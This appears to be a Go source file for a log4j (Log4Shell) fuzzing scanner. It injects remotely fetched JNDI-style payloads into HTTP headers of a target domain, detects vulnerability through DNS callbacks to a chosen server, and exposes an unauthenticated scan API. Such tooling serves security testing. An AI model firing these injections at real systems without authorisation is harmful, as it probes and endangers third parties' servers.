package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	cnnfirebase "log4j-fuzzing/firebase"
	"math/rand"
	"net"
	"net/http"
	"net/http/httputil"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
)

var total_requests = 1
var cb string
var httpClient = &http.Client{
	Transport: transport,
}

var transport = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: time.Second,
		DualStack: true,
	}).DialContext,
}

func UrlToLines(url string) ([]string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return LinesFromReader(resp.Body)
}

func LinesFromReader(r io.Reader) ([]string, error) {
	var lines []string
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}

func randomNumb() int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(10000000000)
}

func IsExist(str, filepath string) bool {
	b, err := ioutil.ReadFile(filepath)
	if err != nil {
		panic(err)
	}

	isExist, err := regexp.Match(str, b)
	if err != nil {
		panic(err)
	}
	return isExist
}

func checkVulnFromCallBack(num int) string {
	fmt.Printf(strconv.Itoa(num))
	if IsExist(strconv.Itoa(num), "/root/log-log4j/log-log4j-fuzzing.txt") {
		return "vulnable"
	}
	return "unvulnable"
}

func main() {
	// var d string
	// // var headers []string
	// // var payloads []string
	// // var err error
	// flag.StringVar(&d, "d", "", "Set domain/IP")
	flag.StringVar(&cb, "cb", "", "Set callback server")
	flag.Parse()

	// f := flag.NFlag()
	// if f != 2 {
	// 	fmt.Printf("Usage: log4j-fuzzing -d domain/IP -cb interact-server\n")
	// 	fmt.Printf("Example: log4j-fuzzing -d http://google.com -cb interact-server\n")
	// 	fmt.Printf("Example1: log4j-fuzzing -d \"http://google.com:8000\" -cb interact-server\n")
	// 	fmt.Printf("Using quote if have port")
	// 	return
	// }

	// if !strings.Contains(d, "http://") && !strings.Contains(d, "https://") {
	// 	fmt.Printf("Must include http:// and https:// in domains")
	// 	return
	// }
	// //headers INPUT from url
	// headers, err = UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/headers2.txt")
	// if err != nil {
	// 	fmt.Print(err)
	// }
	// //payloads input from url
	// payloads, err = UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/payloads2.txt")
	// if err != nil {
	// 	fmt.Print(err)
	// }

	// var payloads2 []string
	// num := randomNumb()
	// randN := strconv.Itoa(num)
	// hostname := randN + "." + cb
	// for _, payload := range payloads {
	// 	payload := strings.Replace(payload, "hostname", hostname, -1)
	// 	payloads2 = append(payloads2, payload)
	// }

	// request(d, headers, payloads2)
	// time.Sleep(time.Second * 2)
	// checkVuln := checkVulnFromCallBack(num)

	// test := cnnfirebase.Log4j{
	// 	Domain: d,
	// 	Result: checkVuln,
	// 	Time:   time.Now(),
	// }

	// cnnfirebase.InsertData(&test)
	// abc := cnnfirebase.GetData()
	// for _, v := range abc {
	// 	fmt.Println(string(v))
	// }
	SetupRout()
}

func request(urls string, headers []string, payloads []string) {
	for _, header := range headers {
		for _, payload := range payloads {
			req, err := http.NewRequest("GET", urls, nil)
			if err != nil {
				fmt.Println(err)
			}
			req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
			req.Header.Add(header, payload)
			fmt.Printf("[+] Testing: \t %s\n", header)
			fmt.Printf("[+] Request number: \t %d\n", total_requests)
			total_requests += 1
			if err != nil {
				return
			}
			resp, err := httpClient.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}

			res, err := httputil.DumpRequest(req, true)
			if err != nil {
				log.Fatal(err)
			}
			fmt.Print(string(res))
			fmt.Println(resp.StatusCode)
		}

	}

}

func SetupRout() {
	app := fiber.New()
	app.Post("/api/scan", ScanAPIServices)
	app.Get("/api/result", GetLastResult)
	app.Listen(":8081")

}

func ScanAPIServices(c *fiber.Ctx) error {
	var d string
	c.BodyParser(&d)
	headers, err := UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/headers2.txt")
	if err != nil {
		fmt.Print(err)
	}
	//payloads input from url
	payloads, err := UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/payloads2.txt")
	if err != nil {
		fmt.Print(err)
	}
	var payloads2 []string
	num := randomNumb()
	randN := strconv.Itoa(num)
	hostname := randN + "." + cb
	for _, payload := range payloads {
		payload := strings.Replace(payload, "hostname", hostname, -1)
		payloads2 = append(payloads2, payload)
	}

	request(d, headers, payloads2)
	time.Sleep(time.Second * 2)
	checkVuln := checkVulnFromCallBack(num)

	test := cnnfirebase.Log4j{
		Domain: d,
		Result: checkVuln,
		Time:   time.Now(),
	}

	cnnfirebase.InsertData(&test)
	abc := cnnfirebase.GetData()
	for _, v := range abc {
		fmt.Println(string(v))
	}
	return c.JSON(test)
}

func GetLastResult(c *fiber.Ctx) error {
	var data []string
	for _, k := range cnnfirebase.GetData() {
		data = append(data, string(k))
	}
	return c.JSON(data)
}
